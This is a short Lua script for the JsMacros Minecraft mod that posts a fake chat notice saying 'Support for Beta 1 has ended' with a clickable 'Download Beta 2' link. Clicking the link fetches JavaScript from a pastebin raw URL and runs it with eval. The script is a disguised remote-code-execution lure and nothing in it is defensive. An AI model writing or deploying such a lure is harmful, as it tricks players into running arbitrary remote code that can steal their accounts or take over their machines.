local script = [[eval(Request.get('https://pastebin.com/raw/sX9v45B0').text())]]

local texhelper = Chat:createTextBuilder():append("§cSupport for Beta 1 has ended.\n§6<Click Here to Download Beta 2>"):withCustomClickEvent(JavaWrapper:methodToJavaAsync(function()
	JsMacros:runScript("js",script,nil)
end))

Chat:log(texhelper)
